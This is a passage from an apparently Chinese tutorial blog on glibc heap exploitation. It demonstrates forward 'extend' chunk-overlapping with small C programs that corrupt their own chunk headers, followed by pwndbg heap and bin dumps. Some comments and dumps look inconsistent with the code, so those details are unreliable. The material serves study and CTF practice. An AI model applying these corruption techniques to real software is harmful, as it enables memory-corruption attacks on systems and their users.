class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">heap</span></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758000</span><br><span class=\"line\">Size: 0xb1</span><br><span class=\"line\"></span><br><span class=\"line\">Top chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5555557580b0</span><br><span class=\"line\">Size: 0x20f51</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">bin</span></span><br><span class=\"line\">fastbins</span><br><span class=\"line\">0x20: 0x0</span><br><span class=\"line\">0x30: 0x0</span><br><span class=\"line\">0x40: 0x0</span><br><span class=\"line\">0x50: 0x0</span><br><span class=\"line\">0x60: 0x0</span><br><span class=\"line\">0x70: 0x0</span><br><span class=\"line\">0x80: 0x0</span><br><span class=\"line\">unsortedbin</span><br><span class=\"line\">all: 0x0</span><br><span class=\"line\">smallbins</span><br><span class=\"line\">empty</span><br><span class=\"line\">largebins</span><br><span class=\"line\">empty</span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">x/30gx 0x555555758000</span></span><br><span class=\"line\">0x555555758000: 0x0000000000000000  0x00000000000000b1</span><br><span class=\"line\">0x555555758010: 0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class=\"line\">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758090: 0x0000000000000090  0x0000000000000020</span><br><span class=\"line\">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580b0: 0x0000000000000000  0x0000000000020f51</span><br><span class=\"line\">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>\n<h2 id=\"4-extend前向overlapping\"><a class=\"markdownIt-Anchor\" href=\"#4-extend前向overlapping\">#</a> 4、extend 前向 overlapping：</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//gcc -g 4.c</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">void</span> *ptr,*ptr1;</span><br><span class=\"line\"></span><br><span class=\"line\">    ptr=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>);<span class=\"comment\">//分配第1个 0x80 的chunk1</span></span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>); <span class=\"comment\">//分配第2个 0x10 的chunk2</span></span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>); <span class=\"comment\">//分配第3个 0x10 的chunk3</span></span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>); <span class=\"comment\">//分配第4个 0x10 的chunk4    </span></span><br><span class=\"line\">    *(<span class=\"type\">long</span> *)((<span class=\"type\">long</span>)ptr<span class=\"number\">-0x8</span>)=<span class=\"number\">0x61</span>;</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(ptr);</span><br><span class=\"line\">    ptr1=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x50</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t还是老样子，进行 4 次 malloc，看下 heap 和 bin 以及 chunk 的内容：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">heap</span></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758000</span><br><span class=\"line\">Size: 0x21</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758020</span><br><span class=\"line\">Size: 0x21</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758040</span><br><span class=\"line\">Size: 0x21</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758060</span><br><span class=\"line\">Size: 0x21</span><br><span class=\"line\"></span><br><span class=\"line\">Top chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758080</span><br><span class=\"line\">Size: 0x20f81</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">bin</span></span><br><span class=\"line\">fastbins</span><br><span class=\"line\">0x20: 0x0</span><br><span class=\"line\">0x30: 0x0</span><br><span class=\"line\">0x40: 0x0</span><br><span class=\"line\">0x50: 0x0</span><br><span class=\"line\">0x60: 0x0</span><br><span class=\"line\">0x70: 0x0</span><br><span class=\"line\">0x80: 0x0</span><br><span class=\"line\">unsortedbin</span><br><span class=\"line\">all: 0x0</span><br><span class=\"line\">smallbins</span><br><span class=\"line\">empty</span><br><span class=\"line\">largebins</span><br><span class=\"line\">empty</span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">x/30gx 0x555555758000</span></span><br><span class=\"line\">0x555555758000: 0x0000000000000000  0x0000000000000021\t\t\t&lt;======Chunk1</span><br><span class=\"line\">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758020: 0x0000000000000000  0x0000000000000021\t\t\t&lt;======Chunk2</span><br><span class=\"line\">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758040: 0x0000000000000000  0x0000000000000021\t\t\t&lt;======Chunk3</span><br><span class=\"line\">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758060: 0x0000000000000000  0x0000000000000021\t\t\t&lt;======Chunk4</span><br><span class=\"line\">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758080: 0x0000000000000000  0x0000000000020f81\t\t\t&lt;======Top Chunk</span><br><span class=\"line\">0x555555758090: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580b0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>​\t\t之后修改 size 域：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">heap</span></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758000</span><br><span class=\"line\">Size: 0x61</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758060</span><br><span class=\"line\">Size: 0x21</span><br><span class=\"line\"></span><br><span class=\"line\">Top chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758080</span><br><span class=\"line\">Size: 0x20f81</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">bin</span></span><br><span class=\"line\">fastbins</span><br><span class=\"line\">0x20: 0x0</span><br><span class=\"line\">0x30: 0x0</span><br><span class=\"line\">0x40: 0x0</span><br><span class=\"line\">0x50: 0x0</span><br><span class=\"line\">0x60: 0x0</span><br><span class=\"line\">0x70: 0x0</span><br><span class=\"line\">0x80: 0x0</span><br><span class=\"line\">unsortedbin</span><br><span class=\"line\">all: 0x0</span><br><span class=\"line\">smallbins</span><br><span class=\"line\">empty</span><br><span class=\"line\">largebins</span><br><span class=\"line\">empty</span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">x/30gx 0x555555758000</span></span><br><span class=\"line\">0x555555758000: 0x0000000000000000  0x0000000000000061</span><br><span class=\"line\">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758020: 0x0000000000000000  0x0000000000000021</span><br><span class=\"line\">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758040: 0x0000000000000000  0x0000000000000021</span><br><span class=\"line\">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758060: 0x0000000000000000  0x0000000000000021</span><br><span class=\"line\">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758080: 0x0000000000000000  0x0000000000020f81</span><br><span class=\"line\">0x555555758090: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580b0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>​\t\t之后 free：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">heap</span></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758000</span><br><span class=\"line\">Size: 0x61</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758060</span><br><span class=\"line\">Size: 0x21</span><br><span class=\"line\"></span><br><span class=\"line\">Top chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758080</span><br><span class=\"line\">Size: 0x20f81</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">bin</span></span><br><span class=\"line\">fastbins</span><br><span class=\"line\">0x20: 0x0</span><br><span class=\"line\">0x30: 0x0</span><br><span class=\"line\">0x40: 0x0</span><br><span class=\"line\">0x50: 0x0</span><br><span class=\"line\">0x60: 0x0</span><br><span class=\"line\">0x70: 0x0</span><br><span class=\"line\">0x80: 0x0</span><br><span class=\"line\">unsortedbin</span><br><span class=\"line\">all: 0x0</span><br><span class=\"line\">smallbins</span><br><span class=\"line\">empty</span><br><span class=\"line\">largebins</span><br><span class=\"line\">empty</span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">x/30gx 0x555555758000</span></span><br><span class=\"line\">0x555555758000: 0x0000000000000000  0x0000000000000061</span><br><span class=\"line\">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758020: 0x0000000000000000  0x0000000000000021</span><br><span class=\"line\">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758040: 0x0000000000000000  0x0000000000000021</span><br><span class=\"line\">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758060: 0x0000000000000000  0x0000000000000021</span><br><span class=\"line\">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758080: 0x0000000000000000  0x0000000000020f81</span><br><span class=\"line\">0x555555758090: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580b0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>​\t\t之后重新 malloc：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">heap</span></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758000</span><br><span class=\"line\">Size: 0x61</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758060</span><br><span class=\"line\">Size: 0x21</span><br><span class=\"line\"></span><br><span class=\"line\">Top chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758080</span><br><span class=\"line\">Size: 0x20f81</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">bin</span></span><br><span class=\"line\">fastbins</span><br><span class=\"line\">0x20: 0x0</span><br><span class=\"line\">0x30: 0x0</span><br><span class=\"line\">0x40: 0x0</span><br><span class=\"line\">0x50: 0x0</span><br><span class=\"line\">0x60: 0x0</span><br><span class=\"line\">0x70: 0x0</span><br><span class=\"line\">0x80: 0x0</span><br><span class=\"line\">unsortedbin</span><br><span class=\"line\">all: 0x0</span><br><span class=\"line\">smallbins</span><br><span class=\"line\">empty</span><br><span class=\"line\">largebins</span><br><span class=\"line\">empty</span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">x/30gx 0x555555758000</span></span><br><span class=\"line\">0x555555758000: 0x0000000000000000  0x0000000000000061</span><br><span class=\"line\">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758020: 0x0000000000000000  0x0000000000000021</span><br><span class=\"line\">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758040: 0x0000000000000000  0x0000000000000021</span><br><span class=\"line\">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758060: 0x0000000000000000  0x0000000000000021</span><br><span class=\"line\">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758080: 0x0000000000000000  0x0000000000020f81</span><br><span class=\"line\">0x555555758090: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580b0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>\n<h2 id=\"5-通过extend前向overlapping\"><a class=\"markdownIt-Anchor\" href=\"#5-通过extend前向overlapping\">#</a> 5、通过 extend 前向 overlapping：</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//gcc -g 5.c</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">void</span> *ptr1,*ptr2,*ptr3,*ptr4;</span><br><span class=\"line\">    ptr1=<span class=\"built_in\">malloc</span>(<span class=\"number\">128</span>);<span class=\"comment\">//smallbin1</span></span><br><span class=\"line\">    ptr2=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>);<span class=\"comment\">//fastbin1</span></span><br><span class=\"line\">    ptr3=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>);<span class=\"comment\">//fastbin2</span></span><br><span class=\"line\">    ptr4=<span class=\"built_in\">malloc</span>(<span class=\"number\">128</span>);<span class=\"comment\">//smallbin2</span></span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>);<span class=\"comment\">//防止与top合并</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(ptr1);</span><br><span class=\"line\">    *(<span class=\"type\">int</span> *)((<span class=\"type\">long</span> <span class=\"type\">long</span>)ptr4<span class=\"number\">-0x8</span>)=<span class=\"number\">0x90</span>;<span class=\"comment\">//修改pre_inuse域</span></span><br><span class=\"line\">    *(<span class=\"type\">int</span> *)((<span class=\"type\">long</span> <span class=\"type\">long</span>)ptr4<span class=\"number\">-0x10</span>)=<span class=\"number\">0xd0</span>;<span class=\"comment\">//修改pre_size域</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(ptr4);<span class=\"comment\">//unlink进行前向extend</span></span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x150</span>);<span class=\"comment\">//占位块</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t经过五次 malloc 之后：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">heap</span></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758000</span><br><span class=\"line\">Size: 0x91</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758090</span><br><span class=\"line\">Size: 0x21</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5555557580b0</span><br><span class=\"line\">Size: 0x21</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5555557580d0</span><br><span class=\"line\">Size: 0x91</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758160</span><br><span class=\"line\">Size: 0x21</span><br><span class=\"line\"></span><br><span class=\"line\">Top chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758180</span><br><span class=\"line\">Size: 0x20e81</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">bin</span></span><br><span class=\"line\">fastbins</span><br><span class=\"line\">0x20: 0x0</span><br><span class=\"line\">0x30: 0x0</span><br><span class=\"line\">0x40: 0x0</span><br><span class=\"line\">0x50: 0x0</span><br><span class=\"line\">0x60: 0x0</span><br><span class=\"line\">0x70: 0x0</span><br><span class=\"line\">0x80: 0x0</span><br><span class=\"line\">unsortedbin</span><br><span class=\"line\">all: 0x0</span><br><span class=\"line\">smallbins</span><br><span class=\"line\">empty</span><br><span class=\"line\">largebins</span><br><span class=\"line\">empty</span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">x/54gx 0x555555758000</span></span><br><span class=\"line\">0x555555758000: 0x0000000000000000  0x0000000000000091</span><br><span class=\"line\">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758090: 0x0000000000000000  0x0000000000000021</span><br><span class=\"line\">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580b0: 0x0000000000000000  0x0000000000000021</span><br><span class=\"line\">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580d0: 0x0000000000000000  0x0000000000000091</span><br><span class=\"line\">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580f0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758100: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758110: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758120: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758130: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758140: 0x0000000000000000  0x0000000000000000</span><br><span 